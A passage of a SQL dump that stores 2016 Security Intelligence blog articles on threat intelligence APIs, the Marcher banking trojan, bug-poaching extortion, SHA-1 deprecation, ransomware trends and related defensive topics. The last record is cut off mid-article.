INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (242, 'Threat Intelligence Currency in the API Economy', 'Doron Shiloach', '2016-6-14', 'The cloud market today is full of references to the API economy. This is certainly with merit since the capabilities of an application programming interface (API) open the doors to a world of new applications, services and products. APIs exist for cloud platforms in every major industry, and security is no exception. The tight integration between security solutions that APIs can make possible helps to close intelligence gaps that attackers might otherwise slip through. APIs also commonly provide   for security infrastructure that enhances efficacy, provides valuable context and reduces your time-to-know and time-to-act on current and emerging threats. The   of the IBM X-Force Exchange platform has provided threat intelligence integration capabilities to other applications since its  . During the platform’s relatively short history, the platform and its API have continued to evolve, with improvements evident in the depth and breadth of the original X-Force threat intelligence available. Within the collaboration portal and the API, X-Force Exchange now provides granular intelligence like Threat Indicators and Observables, to higher order content like Campaigns and Tools, Tactics and Procedures (TTPs).   can deliver this range of threat intelligence via the API, using two major specifications that allow users to use the method that best suits their needs. Probably the most common method for accessing an API today is through a RESTful architectural interface that provides access to data in a reliable, scalable and simple manner. X-Force Exchange does this while providing threat intelligence information in JSON notation. Users who are already familiar with this technology or have proprietary systems that can easily leverage a RESTful API would benefit quickly from this method. In addition, IBM has made the X-Force Exchange   available to help users get started with their integrations. X-Force Exchange also supports   to allow for   and automated machine-to-machine (M2M) exchange of threat intelligence. The adoption of these standards is where the true value of threat intelligence sharing really shines: It provides the ability for users to share information across different tools while abstracting away all the details of how threat intelligence information is captured, processed and exchanged across different platforms. These standards   across the spectrum of users and companies. Check Point Software Technologies, Soltra, Verisign, the United States Department of Defense (DoD) and many more organizations are actively involved in the evolution and promotion of STIX and TAXII via   as the de facto standard for automated M2M threat intelligence exchange. Over the last year, we’ve seen the X-Force Exchange API gain significant traction across a number of different use cases. The use cases commonly represent users interested in programmatically obtaining X-Force data to provide a new source of threat intelligence to their security infrastructure and/or operations. Where the use cases differ is across different user types and their goals for threat intelligence integration: \n With the value of threat intelligence and APIs well established, X-Force is introducing a new offering:  . This will allow users to access the same X-Force threat intelligence available on the platform using a commercially-licensed API option which enjoys increased quota, enhanced query options, full support and the ability to integrate and resell products containing IBM X-Force content. The X-Force threat intelligence commercial API satisfies all the use cases for enhancing a security product or platform, a team’s efficacy and efficiency in a SOC, or a third-party security offering.', '\'Application Programming Interface (API)\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'Threat Sharing\', \'X-Force\'', 'https://securityintelligence.com/threat-intelligence-currency-in-the-api-economy/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (243, 'The Growing Threat From Emerging Cybercrime Markets', 'David Strom', '2016-6-6', 'It may be difficult to imagine, but emerging   can be just as lucrative an opportunity for cybercriminals as those in the developed world. These remote areas have been slow to get online, but malicious actors have already stepped in to take advantage of the lack of security awareness in these populations.\n In the World Economic Forum’s “ ” report, cyberattacks were ranked alongside unemployment and climate change as one of the top 10 most significant risks worldwide.\n “Cybersecurity is a critical issue, and as companies become more global they leave a digital footprint that can make them accessible to anyone from anywhere,” said a   on emerging market conditions.\n The multinational real estate company ranked more than 40 countries on their relative risk of doing business — not just on cybersecurity — and the emerging markets of African nations such as Libya, Angola and the Democratic Republic of the Congo had the highest risk. The authors see cyberthreats on the rise, particularly as global businesses try to expand into more of the developing world.\n That puts all businesses on notice. Just because these events happen in the developing world doesn’t mean they shouldn’t be monitored. To put this in perspective,   results in over $8 billion per year in losses. The country has become the top source and destination for attacks across Central and South America.\n In the U.S., we are used to thinking that because we created the internet, we have some primacy on the technology. But in the last few years, there are now more internet users in China than the U.S., and that’s translating into greater numbers of malicious actors.\n According to  , authorities in China recently arrested 15,000 people for alleged cybercrimes, signaling a new offensive to safeguard the internet. Police investigated more than 60,000 websites and increased efforts not only to block content, but also to insist that users register with their actual names and not pseudonyms.\n There’s more:   recently reported that attacks against the SWIFT financial network could be traced back to criminals in North Korea. The banking network has dominated the headlines recently with news of   around the world. This is yet another emerging cybercrime market already having a massive effect on the world.\n Part of the problem is that many businesses in these emerging markets have limited security awareness, regulations and controls. They also don’t have the security and IT professionals needed to implement and enforce these measures.\n Many   have yet to employ a chief information officer (CIO), let alone significant IT staff to operate security infrastructure or set policies. Without someone to take the lead,   policies are practically nonexistent in the country.\n In Nigeria, cybersecurity laws are barely a year old, “but many key stakeholders such as the judiciary and law enforcement agencies have yet to come up to speed in understanding and implementing” these laws, said a report from  . Nigerian IT security consultants are also in short supply, making it harder for businesses to stay on top of attacks and train their own staff properly.\n We can be sure that cybercriminals are waiting in the wings to exploit growing technologies — and security-illiterate populations. Even though many of these emerging markets are just getting internet access, the best strategy is still to start with the security basics. For example, a   recommended five specific actions, including implementing basic cyber precautions such as regular software patching and restricting data access, enforcing continuous testing for software vulnerabilities, monitoring critical systems and preparing incident response plans.', '\'Advanced Threats\', \'Cybercrime\', \'Cybercriminals\', \'Security Awareness\', \'Skills Gap\'', 'https://securityintelligence.com/the-growing-threat-from-emerging-cybercrime-markets/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (244, 'Insider Threats, Industrial Sabotage and Game Theory', 'Kelly Ryver', '2016-6-6', 'It seems that nearly every week a headline appears related to an attempt to sabotage an  , nuclear power plant, bank, hospital, social media site — the list goes on and on. Almost all the post-event analyses focus on how the attackers got into the network from the outside, usually with the help of malware. Very little analysis is focused on how an attacker would accomplish industrial sabotage from within the environment. A single insider or a group of insiders could easily accomplish their goal of sabotaging industrial systems or exposing sensitive information to outsiders. It starts by establishing a network of confidants or informants, fragmenting the environment at a project or program level, establishing themselves as a critical resource and then slowly but surely achieving complete control over the environment. Most countries are familiar with the term “industrial espionage” and the concept of the insider threat in one form or another. Whether it’s the spy who gets caught, the malware that quietly slinks through the corporate network collecting information and then parsing it out to the highest bidder, or the software backdoor that renders a control system useless, insider threats are nothing new. However, the   is changing. Threats are taking on new forms and evolving faster than most industries can keep up. One aspect of the insider threat landscape that is often overlooked, if not flatly ignored, is the instance in which the insider threat infiltrates an environment, establishes itself and then expands to gain greater control over the environment. This type of insider threat should be considered highly sophisticated, adaptable and intelligent. The primary goal of the individuals conducting these operations is usually that of economic, social or political gain at either the group or individual level. One of the most-studied topics in the fields of economics and political science is game theory. A full scholarly explanation of game theory can easily fill several novels and take up an entire year of collegiate course work, but to put it simply and explain it in a single paragraph, one of the simpler principles from economics is used. The simple economic principle behind game theory states that whenever natural resources are scarce or finite, two interested parties will compete in one of four ways for use of that resource, like so: If the concept of an insider threat were put into game theory terms, one could see how a company could play the role of party A and the insider threat could play the role of party B and vice versa. Most research indicates that a threat will usually identify a target environment, embed itself and then build upon itself to accomplish its end goal — which is either power, profit, public embarrassment, industrial sabotage or some combination of the four. The basic principles of game theory could be applied to understand how an insider threat could establish itself within a company and then expand upon even its most minuscule and seemingly useless accomplishments to become a far more malevolent threat. For the purposes of explaining how this could occur, it helps to consider the term insider threat as any employee, contingent worker, group of employees, consulting firm, group of consultants, union worker, vendor or business partner, but this is of course not an exhaustive list. The insider threat starts by establishing a presence in the environment. If the insider threats were able to gain control over more than half of the active projects within a given environment, they could easily put themselves in the position to maximize profit while sending the company into debt and even damaging its reputation with shareholders and investors. Here are a few areas that could be affected by the insider threat: If this phase is successful, the insider threat could expand its power and control within the environment without arousing too much suspicion. In keeping with the principles of game theory, the insider threat would move into the next phase. The insider threat then gains control of a single program within a corporate environment. If that is a high-visibility program tied to a company’s annual performance, executive compensation or stock price, an insider threat could: After accomplishing phase two, the insider threat moves to gain control over more than half of the positions within a corporate environment; it could be less, depending on the industry and company. Should that occur, the threat could: If an insider threat is allowed to reach this level of control within a company, the damage done would be exceedingly difficult if not impossible to reverse. It would also likely result in one or more data breaches, all but assuring the organization becomes a public spectacle. To mitigate the risk of an insider threat establishing and maintaining majority control over projects, the project management office within a company should establish well-defined processes and cost accounting methods tied to timelines and resources. Personnel should be required to use standard project management software — not an amalgam of text files, hand-scribbled notes, emails, documents and spreadsheets. Personnel should also be required to understand resource leveling and how to calculate timelines in the correct manner. The project management office should be sourcing project resources, documenting and reviewing architectural diagrams, ordering infrastructure, configuring services and designing and building software. Anyone working on the project should be required to change job roles on an annual or biannual basis or rotate to another project entirely. To mitigate the risk of an insider threat establishing and maintaining majority control over programs, the program management office within a company should establish thorough processes for beginning and ending projects. It also needs to vet potential vendors, consulting firms, independent contractors and subcontractors. The office should have all business processes, policies and procedures clearly articulated and precisely defined before anything is initiated — not during the project or after it is complete. To mitigate the risk of an insider threat establishing and maintaining majority control over the corporate environment, senior leadership and executives should have strict controls and procedures in place to measure the performance of all divisions, projects and programs as well as the personnel within those areas. Executive leadership should have visibility into all major programs that could affect their position within the global or domestic marketplace, or with consumers of their products and technology. Poor decision-making and project management has a trickle-down effect: It will usually have a greater impact on consumers than internal personnel. Beyond the social aspects, executive leadership should have visibility into all   at a detailed level. Information security needs to be one of the first lines of defense against insider threats.', '\'Information Security\', \'Insider Threat\', \'Risk Management\', \'Security Leadership\'', 'https://securityintelligence.com/insider-threats-industrial-sabotage-and-game-theory/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (245, 'Compromised Before My Very Eyes: How I Almost Got Hacked', 'Nick Bradley', '2016-6-3', 'The time is about 6:30 p.m. on May 27, and I decide to wind down for the day. I leave my home office and walk upstairs to my gaming rig, fire up some mindless hack and slash, and begin to let the day fade away. Little did I know the real action was about to begin. In the middle of my gaming session, I lose control of my mouse and the   window pops up in the bottom right corner of my screen. As soon as I realize what is happening, I kill the application. Then it dawns on me: I have other machines running TeamViewer! I run downstairs where another computer is still up and running. Low and behold, the TeamViewer window shows up. Before I am able to kill it, the attacker opens a browser window and attempts to go to a new web page. As soon as I reach the machine, I revoke control and close the app. I immediately go to the TeamViewer website and change my password while also enabling two-factor authentication. Lucky for me, those were the only two machines that were still powered on with TeamViewer installed. Also lucky for me is the fact that I was there when it occurred. Had I not been there to thwart the attack, who knows what would have been accomplished. Instead of discussing how I almost got hacked, I’d be talking about the serious implications of my personal data leak. At first, I thought this might have just been an isolated incident of my password being hacked. I hadn’t really used TeamViewer in a long time and had actually forgotten that it was installed on multiple systems. Then I remembered that I recently changed a few passwords in response to the  . At this point, I figured this was most likely due to me not changing my leaked password on TeamViewer. However, being the inquisitive person that I am, I dug a little deeper. A Reddit thread informed me that this was not isolated — and the forum clued me in on exactly what would have happened had I not been sitting there. People claimed to have had their TeamViewer accounts compromised, bank accounts drained, gift cards purchased and more. Additional information and more reports of compromise continue to surface. At this point,   claims that it has not been compromised, stating that the coincidental downtime was due to DNS problems and a possible distributed denial-of-service (DDoS) attack. My speculation on the actual activity I witnessed is that it was basic recon. The attacker was simply going from one compromised machine to the next to identify who the victim was and what the timezone was, as demonstrated by the URL the attacker tried to go to. The figure below is a screen shot of that page. I assume the actor was planning on being in and out quickly, grabbing that little bit of information and then returning during off hours. Then he or she could bypass   and wreak havoc on the victim. Was TeamViewer breached? Did some DNS mischief take place? Is this a case of recycled passwords and simply the fallout from the compromise of LinkedIn or some other company? Hopefully more details will surface in the near future. For the time being, take some recommendations from the story of how I almost got hacked:', '\'Best Practices\', \'Data Breach\', \'Hack\', \'LinkedIn\', \'Password\', \'Password Management\', \'Password Protection\'', 'https://securityintelligence.com/compromised-before-my-very-eyes-how-i-almost-got-hacked/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (246, 'Cybersecurity Today Heads to the Future', 'Sandy Bird', '2016-6-2', 'New   are introduced every day at an increasingly rapid pace. Fortunately, for every new threat that’s introduced, someone, somewhere, has figured out how to remediate it and blogged about it. The problem? With over 2.5 quintillion bytes of data being produced around the world daily — and thousands upon thousands of cybersecurity blogs out there — finding the solution to a threat you don’t yet know exists is an impossible human feat. Fortunately, we no longer have to rely solely on human cognizance.  have advanced at a remarkable rate in recent years and are able to contribute tremendously to cybersecurity today. By using tools such as data mining, machine learning, natural language processing and human-computer interaction to mimic the way the human brain works, cognitive systems can help organizations remediate cyberthreats in record time. Through the automated ingestion of information — such as research reports and best practices — and the ability to understand both structured and unstructured data, cognitive systems can provide junior analysts with real-time input. This allows them to do the job of a higher-level analyst without the additional years of experience. Remember the impossible-to-find cybersecurity blog holding the answers to today’s latest cyberthreats? By crawling through external intelligence on the Internet, cognitive systems can quickly discover what the next zero-day exploit is — and how to protect against it.  may use analysis methods such as machine learning, clustering, graph mining and entity relationship modeling to identify potential threats. This can help speed detection of risky user behavior, data exfiltration and malware before damage occurs. By understanding the semantic context of your analytics and data, while simultaneously exploring code and code structures, cognitive systems can take thousands of vulnerability findings, refine results to a small set of actionable items and take you to locations in your code where you can fix them. In the future, cognitive systems could use natural language processing to find sensitive data in an organization and redact it. As you can see, artificial intelligence is no longer a dream of the future. Intelligent computers —   — exist, and there’s nothing artificial about it. Cybersecurity today can benefit as a result.', '\'Cognitive Security\', \'Cybersecurity\'', 'https://securityintelligence.com/cybersecurity-today-heads-to-the-future/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (247, 'Marcher Mobile Bot Adds UK Targets, Steps Up Banking Fraud Capabilities', 'Limor Kessem', '2016-6-2', 'IBM X-Force Research noted a recent shift in the targets of the Marcher mobile bot. Per X-Force analysis of Marcher samples, the malware has just added nine major bank brands in the U.K. to its target list. This mobile malware already goes after financial entities in other countries, including Germany, Austria, France, Australia and Turkey. According to X-Force intelligence, Marcher first appeared in the wild in late 2013. It is known to be a commercial offering sold in Russian-speaking   by its supposed developer or distribution accomplices. In the first year of its activity, Marcher did not target banks; initially, it was only used by its various operators to steal credit card information from infected victims. To do so, a phishing overlay screen was triggered when users accessed the Google Play app store, plastering a fake window on top of the app store’s activity to request users’ credit card number, expiration date and CVV2 code. In 2014, Marcher began targeting banks, starting with a large bank in Germany,   reported. Aggregating Marcher configurations allows us to see a view of its top target geographies. The U.K. was added to the list in late May 2016. Carefully matching each bank’s look and feel, Marcher adapts its fake overlay screens to the organizations it targets. The adaptation is most likely programmed by the original malware developer for an extra fee. However, overlay screens are not complicated to make and can be created by outsourced black-hat developers or the malicious operators. The second figure below shows Marcher’s targets per app type. Its operators intend to focus on banking applications, but it also has the potential to be used in other credential theft scenarios. Marcher is classified as banking malware, and as such, it is designed to facilitate online banking, e-commerce and payment fraud. Marcher’s theft capabilities allow operators to turn user devices into a central place where they can harvest both credentials and two-factor authentication elements. Since victims are lured into divulging their credentials in real time, cybercriminals who operate Marcher do not patiently wait for users to launch a banking app or browse to their bank’s site at their convenience. To urge infected victims to log in, the malware sends a social engineering SMS message to the device, indicating that a money transfer was made into their account. The curious user is inclined to look into the unexpected transfer and promptly accesses the account. This is the moment Marcher takes action and launches a phishing screen overlay on top of the mobile app/browser. The user unknowingly taps access credentials into the overlay, inadvertently allowing Marcher to steal them. To vet out the validity of the just-phished credentials, Marcher first tests them against the bank’s server and only sends them to the C&C server after a successful login. In this way, Marcher’s operators ensure the utmost data quality. To use the credentials for online banking fraud, Marcher’s operators further rely on the Trojan’s ability to hijack SMS messages and selectively forward phone calls from the device. In some cases, these two deliver authentication elements required for authorizing money transfers or confirming changes made to the account information. By having a means to obtain these extra pieces of information from the same infected device, Marcher’s operators can potentially initiate fraudulent transactions from victim bank accounts in a device takeover scenario — all using an endpoint the fraudster controls. In cases where Marcher’s operators do not target specific banks, the Trojan launches a fake overlay screen upon the launch of any app and demands credit card information. Marcher’s control of the device’s SMS relay and phone calls also allows it to initiate covert text messages/calls to premium toll numbers registered by the cybercriminals in foreign countries, which generates even more illicit income. When it comes to overlay malware, other code varieties — such as  , Slembunk or Acecard — plaster fake overlay screens upon the launch of a banking application on a mobile device. Marcher has now supplemented that with overlay screens that plaster over the web browser when users navigate to their bank’s site. Similarly to how PC Trojans operate, the malware is looking for specific bank apps and bank URLs. For that, it possesses a configuration that instructs it on when to take action, what to fetch and from where to obtain it. For example, Marcher comes loaded with hard-coded screens for some banks it targets, but it also dynamically fetches overlays for a long list of other bank apps. On top of those two options to launch screens on app windows, Marcher also targets bank website URLs. The malware goes into action when victims use the browser to navigate to predefined URLs, fetching the overlay in real time. Browser overlays are launched upon access to banking sites in Austria and Australia, as well as a popular online payments app. Once users enter their information into the fake screen, the data is sent to the attacker’s control server. Beyond its overlay screens, the Marcher mobile bot possesses an SMS hijacking module in addition to call and message diversion options. It can perform data exfiltration of a user’s browser history, contact list and the list of installed apps on the device. Marcher is commercially accessible to different groups of cybercriminals. It is spread to devices via spam emails and text messages that lead users to believe they are downloading a Flash update, even sending them to a download site and providing installation instructions. With user awareness growing in the mobile threat space, Marcher’s operators have taken into account that devices could be protected by antivirus programs. To increase its potential of infection, this Android malware blocks a list of eight popular antivirus apps. In some cases, Marcher sends notifications to the phone to advise the user that the antivirus app still fully protects the device. The Marcher Android malware does not presently affect iOS devices or other platforms. Classified as banking malware, it is designed to phish credentials and intercept the two-factor authentication elements sent to mobile devices. Mitigation should focus on  , SMS hijacking actions and   in cases where credentials have been stolen. Additional advice for users includes: You can find the relevant sample MD5 for Marcher on  .', '\'Android\', \'Banking Trojan\', \'Botnets\', \'IBM X-Force Research\', \'Mobile\', \'Mobile Malware\', \'Mobile Security\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/marcher-mobile-bot-adds-uk-targets-steps-up-banking-fraud-capabilities/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (248, 'Retail Security Risks: 2016 Midyear Roundup', 'Douglas Bonderud', '2016-5-31', 'The numbers are in: According to a new  , a possible security breach is the biggest retail security risk, tied for the top spot with “general economic conditions.” In January, we took a look at the   of early 2016. Now, halfway through 2016, it’s time for a midyear roundup: What are the top retail security risks on the radar? As noted by  , retailers face a particular subset of threats. While large-scale distributed denial-of-service (DDoS) attacks often make headlines for their impact on big companies, just 5 percent of retailers come under fire from DDoS salvos. Why? Because it’s in the best interest of cybercriminals to keep the flow of transactions moving; shutting down retail sites and network-connected point-of-sale (POS) machines means nothing to steal and no data to compromise. Instead, retailers are faced with the double threat of malicious code that steals login credentials and   to watch and record specific transactions. In fact, Graham Cluley noted that over 50 percent of retail security risks leverage these attack vectors. As 2016 rolls toward its halfway point, what threats are top of mind for retailers? According to  , POS malware AbaddonPOS is again making the rounds — aimed specifically at retailers.  , it takes the form of an email campaign designed to drop TinyLoader and then the malware. The emails are highly personalized, with recipients’ names, key company details and better-than-average grammar. In addition, the message displays an active spinner, which is typical of content loading in progress. Victims are asked to enable the content by clicking, which delivers TinyLoader. Command-and-control servers are contacted while TinyLoader grabs a new Abaddon version able to test white-list/blacklist implementations and change the way it siphons credit card data to avoid detection. The malware is under active development, meaning companies can expect to see more advanced strains in the wild over the next few months. When it comes to malware, everything old is (eventually) new again. That’s the case for Microsoft Word macro malware, which got its start in the 1990s, took a 20-year hiatus but is now back with a vengeance — and is targeting retail companies. As noted by  , 98 percent of all Office threats use malicious macros, and retail companies have recently been hit by POS-laced macro threats. All it takes is one user fooled into enabling macros in a supposedly clean email attachment to infect corporate networks and potentially compromise POS systems. There is good news on the horizon, however: Microsoft is rolling out a new feature in Office 2016 that allows companies to control macro use in specific situations. Blocking macros in high-risk scenarios will make it impossible for users to accidentally infect their machines. Retailers also face another problem: perception. According to  , new research from Tripwire showed a worrisome trend: Companies are overconfident in their ability to detect data breaches. While 90 percent of those asked said they could detect a critical data breach in less than a week and 75 percent said they could do it in just 48 hours, only 55 percent of IT pros at firms with more than $100 million in revenue said they checked security compliance “at least weekly.” More worrisome? Implementation of breach detection tools remained flat over the last year. About 59 percent of respondents said that antivirus tools,   and white-listing solutions were “only partially or marginally implemented.” Simply put, in some cases, the biggest retail security risks come from retailers themselves. The security overview for merchants midyear 2016? Improved email campaigns are dropping POS malware, macro infections are on the rise and protection perception may undermine breach detection.', '\'Retail\', \'Retail Breach\', \'Retail Security\', \'Risk Management\'', 'https://securityintelligence.com/retail-security-risks-2016-midyear-roundup/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (249, 'Bug Poaching: A New Extortion Tactic Targeting Enterprises', 'John Kuhn', '2016-5-27', 'Imagine a scenario in which burglars break into your home but steal nothing and don’t harm anything inside. Instead, these burglars take pictures of all your precious belongings and personal assets. Later that day, you receive a letter with copies of all these pictures and an alarming message: “If you’d like to know how we broke into your house, please pay us large sums of money.”\n There’s no explicit threat that they will break in again or that they will give out the pictures of your belongings if you don’t pay. Instead, just a simple statement that you should pay them to understand how to fix your locks.\n Now, replace the house with your corporate network, and the burglars with hackers. And those pictures the burglars took are now your organization’s sensitive corporate data.\n IBM Security has identified an active campaign targeting more than 30 enterprise organizations within the last year. Dubbed bug poaching by researchers, this malicious tactic is being used to extort organizations for large payments of upwards of $30,000 to reveal the website flaws that allowed the attacker onto the corporate network.\n It’s important to note that these are not cases in which the victim organization has sponsored a   that permits this activity. This is all being done under the disguise of pretending to be a good guy when, in reality, it is pure extortion on the black hat scale. The attack is carried out by criminals pretending to want to do something good for the organization but demanding payment for doing so.\n These criminals aren’t afraid of penetrating the organization’s network to steal data. They argue their methods prove the point that the organization’s system is vulnerable. By not immediately destroying or releasing the organization’s data, they are illustrating the ethics (like a white hat) that prevent them from being a complete black hat. Regardless of their rationale, this is data theft and extortion — be it with alleged good intentions or not.\n The process of bug poaching is quite simple and breaks down into a few steps:\n While the attacker doesn’t explicitly threaten to release the data or attack the organization again, it leaves a lot of questions for the victims. The email makes bold statements such as: “Please rest assured that the data is safe with me. It was extracted for proof only. Honestly, I do this job for a living, not for fun.”\n This does not negate the fact that the attacker stole the organization’s data and placed it online, where others could potentially find it or where it can be released. To put it mildly, trusting unknown parties to secure sensitive corporate data — particularly those who breached an organization’s security measures without permission — is not a security best practice. It’s also not clear that attackers won’t just release the data, payment or no payment.\n What do you do if you’re a victim of a bug poaching attack? First, gather all the information you have on the attack, including emails you’ve received and logs from your Web servers. Next, contact local law enforcement, the FBI or Interpol. Supply them with as much detail as possible.\n There is a lot of debate over whether an organization should then pay the ransom. While in this case there is an indication that the attacker may provide details of the vulnerability after payment, one could contend that may not always be the case. The organization would be contributing to cybercrime.\n Additionally, the payment only buys the organization information on the one vulnerability; there’s a good chance that where there’s one avenue of exploitation, there are others. Lastly, the fact that the organization has a history of paying ransom may embolden future trouble.\n On the other hand, one could take the position that a company with a firm security posture should not need to pay the ransom at all. Forensic investigation of the attack and its methodologies could easily identify the exploit used without paying the attacker.\n Utilizing the logs from your Web server would be key, but having these logs easily available can be a challenge for many organizations. Enterprises that aren’t sure how to investigate their own logs can get help from  .\n Protecting against these types of attacks relies on utilizing a defense-in-depth strategy.\n While on the surface these attackers may seem to be less threatening than others, they still pose a threat to an organization’s data and security posture. It’s key to have and maintain an incident response plan in case you face similar threats. Ensuring your organization knows whom to contact and how to respond in advance is critical for effective response and mitigation.\n While bug poaching demands may not feel as severe as sophisticated attacks that expose your data to carding forums or pasting sites, you should treat them equally as seriously.', '\'Advanced Threats\', \'Bug Bounty\', \'Ransomware\', \'Vulnerabilities\'', 'https://securityintelligence.com/bug-poaching-a-new-extortion-tactic-targeting-enterprises/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (250, 'Browser Vendors Are Shutting Down SHA-1 Digital Certificates', 'Bill O\'Donnell', '2016-5-26', 'SHA-1 digital certificates are being shut down by browser vendors based on the findings of a group of security researchers from universities in France, Singapore and the Netherlands. Their paper, titled “ ,” demonstrated how to gain access to encryption keys protected by SHA-1.\n The researchers estimated that $120,000 could rent enough computing power to compromise encryption keys  . Once these encryption keys have been compromised, a malicious actor would have the ability to steal data being sent over the network, including user IDs and passwords, credit card numbers and any other information.\n Most consumers using a browser don’t know whether they are accessing a website with an unsafe SHA-1 certificate. As such, browser vendors are taking it upon themselves to sunset support for any site with SHA-1 digital certificates.\n  recently published an update to its SHA-1 deprecation road map. Starting this summer, Microsoft Internet Explorer and Edge will be removing the address bar lock icon for websites using SHA-1 digital certificates. Microsoft went on to say it intends to completely block access to websites using SHA-1 digital certificates by February 2017.\n Firefox, Chrome and other vendors have made similar announcements. In fact,   already displays an error message when it encounters a SHA-1 certificate.\n The information security industry has been relying on old encryption standards that date back to the 1990s. At the time, these standards were considered safe enough; only nation-state attackers would have had the computing power or technology capable of performing a brute-force attack. Today, technology has drastically improved processing power and capabilities, rendering these old standards inadequate.\n The SHA-1 digital certificate is a subset of the Transport Layer Security (TLS) 1.0 specification. This security standard is becoming increasingly outdated as security researchers continue to demonstrate its weaknesses.\n Every business should consider moving to newer encryption standards to avoid the risk of a data breach. Some risks and recommendations were highlighted in the recent IBM report “ .”\n It is imperative that websites that still rely on SHA-1 digital certificates move to SHA-2. Using SHA-1 digital certificates also implies that the organization is leveraging other old encryption standards within TLS 1.0. As such, it is essential for security professionals to review information and recommendations for both short- and long-term strategies for moving to the   available in the TLS 1.2 protocol.', '\'Browser Security\', \'Certificate Authority (CA)\', \'Cybersecurity\', \'SHA-1\', \'Transport Layer Security (TLS)\'', 'https://securityintelligence.com/browser-vendors-are-shutting-down-sha-1-digital-certificates/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (251, 'Q1 2016 Saw a Record High for Ransomware', 'Larry Loeb', '2016-5-24', 'It’s been a tough year so far for security professionals: A malware outbreak led to a record high for ransomware in the first quarter of 2016. Eldon Sprickerhoff, founder and chief security strategist at  , told Security Intelligence in an email that “malware evolution seems to be as rapid and cutthroat as any jungle environment, where survival and propagation go hand in hand. Authors have frequently co-opted functionality from different malware strains into the next generation of code — regularly sampling the efficacy and profitability of each generation.” Security vendor   noted a 30 percent increase in ransomware victims this quarter compared to the one before. It even said the number of attacks may be higher than these statistics reflect since they only include signature-based and heuristic detections. Some ransomware exploits are blocked by software because of their profile and behaviors alone, and as a result are not included in the reported statistics. Why this   specifically? What is it that makes it so attractive to cybercriminals? The simple answer, of course, is the money that it can produce and the direct path to profit it provides. Let’s say a cyberattacker infiltrates a system and exfiltrates some sort of sensitive information, such as credit card numbers. The attacker is still faced with the task of monetizing that information. This involves identifying a market for it, gaining entry and then possibly offering information to unknown parties — some of whom may well be white-hat security workers. Sellers are possibly exposing themselves to authorities by the very act of participating in such a marketplace. A ransomware exploit is a more direct way to payment. The victim uses a relatively anonymous digital currency to pay the ransom, as well as using a slightly less obvious Tor browser to connect to the criminal. That is not to say this is a foolproof scheme by any means. Tor is not an anonymity panacea; it can be defeated by countermeasures, which can lead to the unveiling of the criminal’s identity. The bitcoin payment avenue is also open to law enforcement efforts. For example, on May 7, the founder of an online underworld bank that had allegedly laundered billions of dollars for criminals from 2005 to 2013 was sentenced to 20 years in prison,   reported. Such banks may work for a time, but their continued operation often leads to prosecution. While the current statistics show a rise in ransomware, it may be a surprise to learn that it is not yet the most common form of malware.  reported that after staying steady for the last six months of 2015, ransomware detection began to climb: February saw a 19 percent increase over January, while March had almost a 10 percent increase over February. Then, in April, infections more than doubled — so the future Q2 report may not be much better than Q1. To add insult to injury, the percentage of overall infections attributed to ransomware was the highest of any other month in the last three years. I spoke with Ryan Gerding of Enigma Software about this. “It’s still infinitesimal compared to the other infections out there. Good old-fashioned adware — the kind that messes with your toolbar — as well as rogue anti-spyware are by far more prevalent than ransomware with about a 40 percent detection rate,” he said. “Ransomware makes up less than one percent — 0.75 [percent], actually — of all of the infections that were detected on our customers’ computers. Nuisance infections — the kind that make your computer run more slowly — are far more prevalent at a 20 percent detection. But because they don’t steal and extort, they get a lot less attention.” Gerdling also offered advice on dealing with the malware:”Don’t ever pay the ransom, for a couple of reasons: First, it proves to the bad guys that this mode of tricking you works. Second, there is no guarantee that you will get your files back. The best defense is to regularly back up your data. The other advice we offer to anyone — individual users or businesses — is to think about that link before you click on it. It’s the main way that criminals are getting these  .” Another characteristic of ransomware, as Gerling alluded to, is that it depends on the victim not having an effective backup strategy. Having one means the entire ransomware strategy can be easily defeated. Cybercriminals assume that the discipline needed for such a strategy is not there, and too many times they are right. The crisis that is a ransomware attack is but one reason a backup and restoration policy has to be in place. Computers are machines, and therefore are subject to the hardware mishaps that inevitably occur. Without a way to respond to failure and  , data will be lost — regardless if the cause is ransomware or a hard disk crash. Ransomware just highlights the perils of not having this effort present. Ransomware is a dramatic attack, replete with splash screens flouting the skull-and-crossbones and ransom notes. But it can be defeated by any user who carries out what should be done in any case: by having a reliable backup and restore method active.', '\'Advanced Threats\', \'Malware\', \'Ransomware\', \'Threat Intelligence\'', 'https://securityintelligence.com/q1-2016-saw-a-record-high-for-ransomware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (252, 'The Path to Cybersecurity Confidence Starts With Penetration Testing', 'Daniel Carnelley', '2016-5-23', 'Every day there seems to be a new vulnerability or large-scale information security breach to read about. These constant reminders of cybersecurity’s importance are highly justified. But for large enterprises, which are offered multiple products and solutions to protect their systems from a growing variety of threats, it’s often difficult to determine where to start when it comes to boosting their cybersecurity confidence. Surely a large enterprise needs to assess its weak spots and gaps before purchasing specific security products. Technically assessing systems and networks gives insight into what businesses actually need to best protect themselves. It also puts a stop to the bolting-on of the latest security product regardless of whether it is best for their systems. This need for technical assessment points to penetration testing. Having penetration testers assess your systems can provide a comprehensive and prioritized view of what should be done to best protect them from the growing number of cyberthreats. Once penetration testing has exposed the gaps in security, the testers can make recommendations on how to close them. In “ ,” Eitan Worcel articulated the value and skills of a pen tester: “Great pen testers have deep knowledge of operating systems, networking, scripting languages and more. They are also eager to learn new approaches and employ the new content that they learn in practice. They combine manual work with automated tools and conduct their testing in iterations, 